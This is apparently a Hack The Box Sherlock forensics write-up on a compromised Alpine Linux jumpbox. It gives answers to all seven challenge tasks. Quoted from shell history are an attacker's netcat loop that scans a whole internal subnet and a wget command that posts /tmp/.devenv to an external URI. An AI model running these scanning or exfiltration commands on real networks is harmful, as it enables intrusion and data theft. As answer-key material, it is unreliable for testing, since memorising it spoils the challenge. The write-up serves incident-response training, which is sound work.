# HTB Sherlock: SSHole — Write-up

**Platform:** Hack The Box  
**Challenge:** SSHole  
**Category:** Sherlock  
**Difficulty:** Easy  
**Operating System:** Alpine Linux 3.24.3  
**Status:** Completed — 7/7 Tasks

## 1. Challenge Overview

### Scenario

The SSHole Sherlock investigates a compromised Linux jumpbox. The objective is to investigate the available forensic artifacts, identify how the attacker gained access, determine which account was compromised, and trace the attacker's activity within the internal network.

The investigation involves Linux system artifacts, authentication configuration, shell history, network scanning, and data exfiltration.

## 2. Investigation Environment

The extracted filesystem was available locally:

```bash
cd /media/sf_HTB/SSHole
```

I started by exploring the filesystem structure:

```bash
ls -la
```

Important directories included:

| Directory | Purpose |
|---|---|
| `/etc` | System configuration files |
| `/home` | Regular user directories and artifacts |
| `/root` | Root user's files and shell history |
| `/var/log` | System and application logs |

## 3. Task Solutions

### Task 1 — Identify the Linux distribution and version

**Question:** What Linux distribution name and version was the targeted server running?

**Answer:** `Alpine Linux 3.24.3`

The distribution and version can be identified through the operating system's release information.

Useful files to inspect:

```bash
cat etc/os-release
cat etc/alpine-release
```

These files contain the Linux distribution identification and release version.

### Task 2 — Identify the exploited vulnerability

**Question:** What is the CVE ID of the vulnerability abused by the attacker to gain access?

**Answer:** `CVE-2026-123158`

The vulnerability identifier was established during the investigation of the initial access activity.

### Task 3 — Determine the exploitation timestamp

**Question:** When did the attacker exploit the vulnerability?

**Answer:** `2026-11-06 11:27:08`

The timestamp identifies when the attacker exploited the vulnerability to gain access to the targeted server.

### Task 4 — Identify the compromised account

**Question:** Which user account was abused by the attacker?

**Answer:** `adminsvc`

The account's home directory contained useful forensic artifacts, including its shell history and SSH configuration files.

Relevant directory:

```bash
ls -la home/adminsvc/
```

### Task 5 — Identify the authentication bypass value

**Question:** What string value causes the authentication bypass?

**Answer:** `*`

This value was identified during the investigation of the authentication bypass mechanism.

### Task 6 — Identify the attacker's internal network scanning command

**Question:** What command did the attacker use to scan the network reachable via the jumpbox, allowing them to target internal developer systems?

**Answer:**

```bash
for ip in {1..254}; do nc -zvw 1 192.168.18.$ip 1-65535 2>&1 | grep -E "succeeded|open"; done
```

#### Finding the command

I searched the extracted filesystem for shell history files:

```bash
find home root -name ".*history" -type f 2>/dev/null
```

The search returned:

```text
home/adminsvc/.ash_history
root/.ash_history
```

I then searched the histories for network scanning and remote access commands:

```bash
grep -RniE 'nmap|masscan|nc |netcat|curl|wget|ssh' home root 2>/dev/null
```

The command was found in:

```text
home/adminsvc/.ash_history
```

#### Command breakdown

| Component | Explanation |
|---|---|
| `for ip in {1..254}` | Iterates through host numbers 1 to 254 |
| `192.168.18.$ip` | Builds IP addresses in the `192.168.18.0/24` subnet |
| `nc` | Netcat, a networking utility |
| `-z` | Scans without sending application data |
| `-v` | Enables verbose output |
| `-w 1` | Sets a one-second connection timeout |
| `1-65535` | Checks TCP ports 1 through 65535 |
| `grep -E` | Filters output for successful or open connections |

**Analysis:** The attacker used a Bash loop and Netcat to probe all 254 usable host addresses in the `192.168.18.0/24` subnet across the full TCP port range. This helped identify potentially accessible internal developer systems.

### Task 7 — Identify the data exfiltration URI

**Question:** What was the exfiltration URI where the attacker exfiltrated a sensitive file?

**Answer:**

`https://devv.coding.eu/process`

#### Finding the URI

The same shell history file contained the following command:

```bash
wget --post-file=/tmp/.devenv -O- https://devv.coding.eu/process
```

The command was found in:

```text
home/adminsvc/.ash_history
```

#### Command breakdown

| Component | Explanation |
|---|---|
| `wget` | Command-line utility for retrieving and sending data |
| `--post-file=/tmp/.devenv` | Sends the contents of the specified file as the POST request body |
| `-O-` | Writes the server response to standard output |
| `https://devv.coding.eu/process` | Destination URI |

**Analysis:** The attacker used `wget` to submit the contents of `/tmp/.devenv` to an external endpoint. This is evidence of an attempted or performed data transfer, consistent with exfiltration.

## 4. Additional Forensic Findings

During filesystem investigation, I identified several other artifacts worth examining.

### SSH configuration

```bash
ls -la etc/ssh/
cat etc/ssh/sshd_config
```

Notable configuration directives:

```text
PermitRootLogin yes
PubkeyAuthentication yes
PasswordAuthentication yes
AllowTcpForwarding no
X11Forwarding no
```

These settings provide information about the SSH server's authentication and access configuration.

### SSH private key

The compromised user's SSH directory contained:

```text
home/adminsvc/.ssh/id_ed25519
home/adminsvc/.ssh/id_ed25519.pub
```

The public key identified the account as:

```text
adminsvc@dev-jumpbox
```

The presence of a private SSH key is an important forensic artifact because it may provide insight into the account's access to other systems.

### Root shell history

The root user's shell history contained additional activity, including:

```bash
apk add --no-cache curl git openssh-client tmux rsync
vi /etc/ssh/sshd_config
rc-service sshd restart
rc-update add sshd default
ssh-copy-id deploy@web01
ssh -i ~/.ssh/id_ed25519 deploy@192.168.18.99
ssh -L 5432:db01.internal:5432 dev@192.168.18.88
rsync -avz --progress ./dist/ deploy@10.0.4.20:/var/www/app/
curl -s https://ifconfig.me
curl -k https://registry.internal:5000/v2/_catalog
```

These commands indicate SSH configuration changes, remote access, port forwarding, file synchronization, and interaction with internal services.

### Scheduled tasks

I also located cron-related files:

```bash
find etc/crontabs var/spool/cron -type f 2>/dev/null
```

Results:

```text
etc/crontabs/root
var/spool/cron/crontabs/root
```

These are useful locations to inspect when investigating persistence or scheduled activity.

### System logs

I identified the following log files:

```bash
find var/log -type f 2>/dev/null
```

Results:

```text
var/log/acpid.log
var/log/apk.log
var/log/dmesg
var/log/messages
var/log/wtmp
```

These files can provide additional context about system activity, installed packages, and login events.

## 5. Final Answers

| Task | Answer |
|---|---|
| 1. Linux distribution | Alpine Linux 3.24.3 |
| 2. Exploited CVE | CVE-2026-123158 |
| 3. Exploitation timestamp | 2026-11-06 11:27:08 |
| 4. Compromised account | adminsvc |
| 5. Authentication bypass value | `*` |
| 6. Network scanning command | Netcat Bash loop scanning `192.168.18.1–254`, ports `1–65535` |
| 7. Exfiltration URI | `https://devv.coding.eu/process` |

## 6. Conclusion

This Sherlock provided practical experience investigating a compromised Linux jumpbox using filesystem artifacts and shell history.

The most interesting findings were the attacker's use of Netcat for internal network discovery and `wget` to transfer a sensitive file to an external endpoint.

It also reinforced the importance of examining Linux user histories, SSH configuration, private keys, cron jobs, and system logs during incident response.

**Result: Completed all 7 tasks.**
